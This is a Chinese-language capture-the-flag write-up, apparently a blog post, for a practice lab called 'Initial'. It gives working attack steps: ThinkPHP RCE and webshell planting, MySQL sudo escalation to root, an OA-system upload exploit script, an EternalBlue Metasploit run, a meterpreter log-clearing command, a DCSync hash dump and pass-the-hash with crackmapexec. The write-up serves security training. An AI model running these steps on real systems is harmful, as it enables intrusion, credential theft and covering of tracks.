+++
date = '2026-03-05T22:30:00+08:00'
lastmod = '2026-03-05T22:30:00+08:00'
draft = false
title = '春秋云境 - Initial WriteUP'
categories = ['WriteUP', '春秋云境']
tags = ['WriteUP', '春秋云境']

+++

## flag 1

用 fscan 扫描发现存在 thinkphp RCE 漏洞，用工具 RCE。  

![](../assets/屏幕截图%202025-03-06%20183128.png)

直接用工具写马，再用 vshell 上线。  

![](../assets/屏幕截图%202025-03-06%20191024.png)

我们可以查看 `/var/www/.bash_history` 中存在提示，而且 MySQL 有 root 权限，所以直接使用 MySQL 提权。（或者使用[提权工具](https://github.com/peass-ng/PEASS-ng)）

![](../assets/屏幕截图%202025-03-06%20194923.png)

```plaintext
www-data@ubuntu-web01:/var/www/html$ sudo mysql -e '\! /bin/sh'
# whoami
root
# cd /root
# ls -al
total 48
drwx------  6 root root 4096 Jun  5  2022 .
drwxr-xr-x 18 root root 4096 Mar  6 18:26 ..
-rw-------  1 root root 1669 Jun  5  2022 .bash_history
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwx------  3 root root 4096 Apr 28  2022 .cache
-rw-------  1 root root   18 Jun  5  2022 .mysql_history
drwxr-xr-x  2 root root 4096 Apr 28  2022 .pip
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rw-r--r--  1 root root  206 Mar  6 18:26 .pydistutils.cfg
drwx------  2 root root 4096 Apr 28  2022 .ssh
-rw-------  1 root root 2988 Jun  5  2022 .viminfo
drwxr-xr-x  2 root root 4096 Jun  5  2022 flag
# cat flag
cat: flag: Is a directory
# cd flag
# ls -al
total 12
drwxr-xr-x 2 root root 4096 Jun  5  2022 .
drwx------ 6 root root 4096 Jun  5  2022 ..
-r-------- 1 root root 1588 Jun  5  2022 flag01.txt
# cat flag01.txt
 ██     ██ ██     ██       ███████   ███████       ██     ████     ██   ████████ 
░░██   ██ ░██    ████     ██░░░░░██ ░██░░░░██     ████   ░██░██   ░██  ██░░░░░░██
 ░░██ ██  ░██   ██░░██   ██     ░░██░██   ░██    ██░░██  ░██░░██  ░██ ██      ░░ 
  ░░███   ░██  ██  ░░██ ░██      ░██░███████    ██  ░░██ ░██ ░░██ ░██░██         
   ██░██  ░██ ██████████░██      ░██░██░░░██   ██████████░██  ░░██░██░██    █████
  ██ ░░██ ░██░██░░░░░░██░░██     ██ ░██  ░░██ ░██░░░░░░██░██   ░░████░░██  ░░░░██
 ██   ░░██░██░██     ░██ ░░███████  ░██   ░░██░██     ░██░██    ░░███ ░░████████ 
░░     ░░ ░░ ░░      ░░   ░░░░░░░   ░░     ░░ ░░      ░░ ░░      ░░░   ░░░░░░░░  

Congratulations!!! You found the first flag, the next flag may be in a server in the internal network.

flag01: flag{60b53231-
```

## flag 2

查看内网网段，上传 fscan 进行内网的扫描，结果如下。  

![](../assets/屏幕截图%202025-03-06%20201307.png)

```plaintext
# ./fs -h 172.22.1.0/24 -o 1.txt

   ___                              _    
  / _ \     ___  ___ _ __ __ _  ___| | __ 
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <    
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.8.4
start infoscan
(icmp) Target 172.22.1.15     is alive
(icmp) Target 172.22.1.2      is alive
(icmp) Target 172.22.1.18     is alive
(icmp) Target 172.22.1.21     is alive
[*] Icmp alive hosts len is: 4
172.22.1.15:22 open
172.22.1.15:80 open
172.22.1.18:3306 open
172.22.1.21:445 open
172.22.1.18:445 open
172.22.1.2:445 open
172.22.1.21:139 open
172.22.1.18:139 open
172.22.1.2:139 open
172.22.1.21:135 open
172.22.1.18:135 open
172.22.1.2:135 open
172.22.1.18:80 open
172.22.1.2:88 open
[*] alive ports len is: 14
start vulscan
[*] WebTitle http://172.22.1.15        code:200 len:5578   title:Bootstrap Material Admin
[*] NetInfo 
[*]172.22.1.21
   [->]XIAORANG-WIN7
   [->]172.22.1.21
[*] NetBios 172.22.1.2      [+] DC:DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393
[*] NetInfo 
[*]172.22.1.2
   [->]DC01
   [->]172.22.1.2
[*] NetInfo 
[*]172.22.1.18
   [->]XIAORANG-OA01
   [->]172.22.1.18
[*] OsInfo 172.22.1.2   (Windows Server 2016 Datacenter 14393)
[+] MS17-010 172.22.1.21        (Windows Server 2008 R2 Enterprise 7601 Service Pack 1)
[*] NetBios 172.22.1.18     XIAORANG-OA01.xiaorang.lab          Windows Server 2012 R2 Datacenter 9600
[*] NetBios 172.22.1.21     XIAORANG-WIN7.xiaorang.lab          Windows Server 2008 R2 Enterprise 7601 Service Pack 1
[*] WebTitle http://172.22.1.18        code:302 len:0      title:None 跳转url: http://172.22.1.18?m=login
[*] WebTitle http://172.22.1.18?m=login code:200 len:4012   title:信呼协同办公系统
[+] PocScan http://172.22.1.15 poc-yaml-thinkphp5023-method-rce poc1
已完成 14/14
[*] 扫描结束,耗时: 8.612290576s
```

下一步要进行内网渗透，可以使用 frp 等反向代理工具搭建通道进行内网渗透，这里使用 vshell 直接搭建隧道代理，再用 Proxifier 连接。  

![](../assets/bd3aeff1af9bf3a5460b13909171252.png)

尝试登录信呼协同办公系统，结果弱口令 `admin/admin123` 登录进去了，进去看看有没有能够利用的信息。  

![](../assets/屏幕截图%202025-03-06%20200701.png)

我们发现文件操作中有上传过 `shell.php`，猜测应该有文件上传漏洞，结果在“任务资源-文件传送”中发现文件上传的入口，上传木马。  

![](../assets/屏幕截图%202025-03-06%20201735.png)

但是我们无法访问木马，所以去网上找下这个系统的漏洞，直接用 PoC。  

```python
# 1.php为webshell

# 需要修改以下内容：
# url_pre = 'http://<IP>/'
# 'adminuser': '<ADMINUSER_BASE64>',
# 'adminpass': '<ADMINPASS_BASE64>',

import requests

session = requests.session()
url_pre = 'http://<IP>/'
url1 = url_pre + '?a=check&m=login&d=&ajaxbool=true&rnd=533953'
url2 = url_pre + '/index.php?a=upfile&m=upload&d=public&maxsize=100&ajaxbool=true&rnd=798913'
# url3 = url_pre + '/task.php?m=qcloudCos|runt&a=run&fileid=<ID>'
data1 = {
    'rempass': '0',
    'jmpass': 'false',
    'device': '1625884034525',
    'ltype': '0',
    'adminuser': '<ADMINUSER_BASE64>',
    'adminpass': '<ADMINPASS_BASE64>',
    'yanzm': ''    
}

r = session.post(url1, data=data1)
r = session.post(url2, files={'file': open('1.php', 'r+')})
filepath = str(r.json()['filepath'])
filepath = "/" + filepath.split('.uptemp')[0] + '.php'
print(filepath)
id = r.json()['id']
url3 = url_pre + f'/task.php?m=qcloudCos|runt&a=run&fileid={id}'
r = session.get(url3)
r = session.get(url_pre + filepath + "?1=system('dir');")
print(r.text)
```

直接写马，然后找到 flag。  

![](../assets/屏幕截图%202025-03-06%20205743.png)

```plaintext
 ___    ___ ___  ________  ________  ________  ________  ________   ________     
|\  \  /  /|\  \|\   __  \|\   __  \|\   __  \|\   __  \|\   ___  \|\   ____\    
\ \  \/  / | \  \ \  \|\  \ \  \|\  \ \  \|\  \ \  \|\  \ \  \\ \  \ \  \___|    
 \ \    / / \ \  \ \   __  \ \  \\\  \ \   _  _\ \   __  \ \  \\ \  \ \  \  ___  
  /     \/   \ \  \ \  \ \  \ \  \\\  \ \  \\  \\ \  \ \  \ \  \\ \  \ \  \|\  \ 
 /  /\   \    \ \__\ \__\ \__\ \_______\ \__\\ _\\ \__\ \__\ \__\\ \__\ \_______\
/__/ /\ __\    \|__|\|__|\|__|\|_______|\|__|\|__|\|__|\|__|\|__| \|__|\|_______|
|__|/ \|__|                                                                      


flag02: 2ce3-4813-87d4-

Awesome! ! ! You found the second flag, now you can attack the domain controller.
```

## flag 3

下面我们要用到渗透框架 Metasploit Framework，Kali 中自带这个框架，首先我们要设置代理不然我们无法访问内网，Kali 中自带了一个 `proxychains4` 工具，我们只需要修改配置文件即可设置好代理了。  

```bash
vim /etc/proxychains4.conf

"""
[ProxyList]
......
sock5 47.115.148.66 1234
"""
```

由于我们之前扫描到内网域内的主机存在 `MS17-010` 的漏洞，这个是大名鼎鼎的永恒之蓝漏洞，我们在框架中搜索这个漏洞，然后选择第一个模块进行利用，这里经过测试发现机器不出网，所以我们选择让它进行正向连接。  

```bash
proxychains4 msfconsole
search ms17-010
use exploit/windows/smb/ms17_010_eternalblue
set payload windows/x64/meterpreter/bind_tcp_uuid
set RHOSTS 172.22.1.21
exploit
```

运行成功后出现如下提示。  

![](../assets/屏幕截图%202025-03-06%20212121.png)

下面是 meterpreter 模块常用的一些命令：  

```bash
meterpreter > screenshot # 捕获屏幕
meterpreter > upload hello.txt c:// #上传文件
meterpreter > download d://1.txt # 下载文件
meterpreter > shell # 获取cmd
meterpreter > clearev # 清除日志
```

紧接上文，我们拿下这台机子并没有 flag，那么我们就要想办法横向移动到 DC 域控机器上了，下面要使用工具去进行 DCSync 攻击。  

> 在域中，不同的域控之间，默认每隔 15min 就会进行一次域数据同步。当一个额外的域控想从其他域控同步数据时，额外域控会像其他域控发起请求，请求同步数据。如果需要同步的数据比较多，则会重复上述过程。DCSync 就是利用这个原理，通过目录复制服务（Directory Replication Service，DRS）的 GetNCChanges 接口像域控发起数据同步请求，以获得指定域控上的活动目录数据。目录复制服务也是一种用于在活动目录中复制和管理数据的 RPC 协议。该协议由两个 RPC 接口组成。分别是 drsuapi 和 dsaop。  
> DCSync是 mimikatz 在 2015 年添加的一个功能，能够用来导出域内所有用户的 hash。

也就是说我们可以通过 `DCSync` 来导出所有用户的 `hash` 然后进行哈希传递攻击，要想使用 `DCSync` 必须获得以下任一用户的权限：  
- Administrators 组内的用户  
- Domain Admins 组内的用户  
- Enterprise Admins 组内的用户域控制器的计算机帐户  

而我们回到之前的扫描记录发现，我们拿下的这台主机就是 Enterprise 用户，满足 DCSync 的攻击条件，那么我们就调用 mimikatz 模块来导出用户的 hash。  

```bash
load kiwi
kiwi_cmd lsadump::dcsync /domain:xiaorang.lab /all /csv exit
```

这里我们看到有 `Administrator` 用户的 `hash`，接下来我们就可以使用 `crackmapexec` 来进行哈希传递攻击，来实现 DC 域控上的任意命令执行，通过以下命令来获取 `flag3`。  

```bash
proxychains crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x "type Users\Administrator\flag\flag03.txt"
```

运行结果如下。  

```plaintext
___   ___
 \\ / /       / /    // | |     //   ) ) //   ) )  // | |     /|    / / //   ) )
  \  /       / /    //__| |    //   / / //___/ /  //__| |    //|   / / //
  / /       / /    / ___  |   //   / / / ___ (   / ___  |   // |  / / //  ____
 / /\\     / /    //    | |  //   / / //   | |  //    | |  //  | / / //    / /
/ /  \\ __/ /___ //     | | ((___/ / //    | | //     | | //   |/ / ((____/ /


flag03: e8f88d0d43d6}

Unbelievable! ! You found the last flag, which means you have full control over the entire domain network.
```

